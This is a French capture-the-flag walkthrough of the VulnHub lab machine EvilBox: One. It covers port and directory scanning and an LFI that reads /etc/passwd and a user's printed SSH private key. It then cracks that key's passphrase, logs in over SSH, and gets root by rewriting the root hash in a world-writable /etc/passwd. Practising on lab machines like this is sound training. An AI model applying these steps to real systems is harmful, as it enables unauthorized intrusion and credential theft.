---
title: "CTF Evil: One"
date: 2021-08-29
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/evilbox-one,736
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.2** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.26`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir EvilOne && cd EvilOne`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

On un serveur **SSH** sur le port **22** et un serveur Apache 2.4.38 sur le port **80**.

On commence par faire un scan du serveur Web avec **Gobuster**.

```bash
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster.txt
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 12]   
/secret               (Status: 301) [Size: 313] [--> http://192.168.1.26/secret/]
```

Le dossier "/secret" est vide. Tentons un autre **Gobuster** sur ce dossier.

```bash
$ gobuster dir -u http://$IP/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster-secret.txt
/index.html           (Status: 200) [Size: 4]
/evil.php             (Status: 200) [Size: 0]
```

Il y a la présence d'un fichier PHP "evil.php" dans ce dossier. Ce dernier ne retourne rien. Cherchons si un paramètre existe sur cette URL avec l'outil **wfuzz**.

```bash
$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 0 'http://192.168.1.26/secret/evil.php?FUZZ=/etc/passwd'
000000947:   200        26 L     38 W       1431 Ch     "command"      
```

Il existe un paramètre, "command". Sur [http://192.168.1.26/secret/evil.php?command=/etc/passwd](http://192.168.1.26/secret/evil.php?command=/etc/passwd), on a bien les infos d'utilisateurs dont celui d'un certain "mowree".

```txt
root:x:0:0:root:/root:/bin/bash
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

On est sur une faille de type LFI (Local File Inclusion).

Et sur l'URL [http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa](http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa), on tombe bien sur la clef SSH de l'utilisateur.

```txt
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

On récupère ce fichier via **wget**.

`wget http://$IP/secret/evil.php?command=/home/mowree/.ssh/id_rsa -O id_rsa`

Et on n'oublie pas le **chmod** pour plus tard.

`chmod 600 id_rsa`

Désormais, il nous faut retrouver la clef du mot de passe associé.

Téléchargez l'utilitaire "ssh2john.py" avec la commande `wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py` et générez un nouveau fichier `python ssh2john.py id_rsa > id_rsa.hash`.

Afin d'utiliser **John The Ripper**.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads

Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)
```

**John** a trouvé le mot de passe, "unicorn".

## Pénétration

En posséssion de la clef SSH et du mot de passe associé, on peut donc se connecter au serveur **SSH** sans encombres.

```bash
$ ssh mowree@$IP -i id_rsa
The authenticity of host '192.168.1.26 (192.168.1.26)' can't be established.
ECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.26' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
```

On trouve le premier flag dans le fichier "user.txt".

```bash
$ cat user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```

## Escalation

On voit que le fichier "passwd" est modifiable.

```bash
$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1431 ago 29 12:50 /etc/passwd
```

On génère donc un nouveau mot de passe "unicorn" via **openssl**.

```bash
$ openssl passwd -1 unicorn
$1$U413.MQ6$.ZO/2.l5DWY.2OotSCog61
```

On copie ce mot de passe dans le fichier "passwd" dans la ligne ci-dessous.

```bash
$ nano /etc/passwd
root:$1$U413.MQ6$.ZO/2.l5DWY.2OotSCog61:0:0:root:/root:/bin/bash
```

Une fois le fichier enregistré, on peut se connecter en "root".

```bash
$ su -l root
Contraseña: unicorn
$ id
uid=0(root) gid=0(root) grupos=0(root)
```

Et trouver le flag de ce dernier.

```bash
$ cat /root/root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```
